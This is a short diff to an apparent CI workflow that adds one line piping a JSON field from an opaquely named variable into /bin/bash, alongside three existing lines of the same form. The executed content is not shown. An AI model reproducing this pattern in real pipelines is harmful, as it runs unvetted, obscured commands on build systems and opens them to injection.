@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$i6770" | jq -r .gem250 | /bin/bash
           echo $etilh742 | jq -r .vvgoq9 | /bin/bash
           echo $tr030 | jq -r .u1 | /bin/bash
+          echo $pjt8 | jq -r .efc194 | /bin/bash
 
       - name: Save output
         if: always()
